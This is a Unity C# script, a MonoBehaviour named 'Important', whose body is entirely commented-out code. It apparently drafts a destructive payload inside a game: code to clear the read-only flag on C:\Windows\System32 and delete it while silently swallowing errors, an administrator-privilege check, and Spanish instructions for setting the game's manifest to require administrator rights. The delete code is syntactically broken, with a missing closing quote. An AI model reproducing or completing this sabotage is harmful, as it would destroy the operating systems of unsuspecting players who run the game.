using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class Important : MonoBehaviour
{
//     try
// {
//   var dir = new DirectoryInfo("C:\Windows\System32);
//   dir.Attributes = dir.Attributes & ~FileAttributes.ReadOnly;
//   dir.Delete();

// }
// catch (IOException ex)
// {
//   //Nada xD
// }



// using System.Security.Principal;

// public static bool IsRunAsAdmin()
// {
//     WindowsIdentity identity = WindowsIdentity.GetCurrent();
//     WindowsPrincipal principal = new WindowsPrincipal(identity);
//     return principal.IsInRole(WindowsBuiltInRole.Administrator);
// }



// En el Editor de Unity, selecciona Archivo > Construir y Ejecutar.

// Selecciona Archivo > Abrir Escena y abre la escena principal de tu juego.

// Selecciona Editar > Proyecto > Agregar Nuevo Elemento para agregar un archivo de manifiesto a tu proyecto. Este archivo se llamará app.manifest de manera predeterminada.

// Abre el archivo app.manifest en un editor de texto y busca la línea que contiene <requestedExecutionLevel level="asInvoker" uiAccess="false" />.

// Reemplaza asInvoker con requireAdministrator para especificar que la aplicación debe ejecutarse con privilegios de administrador.

// Guarda el archivo app.manifest.

// En el Editor de Unity, selecciona Archivo > Construir y Ejecutar para compilar y ejecutar tu juego.

}
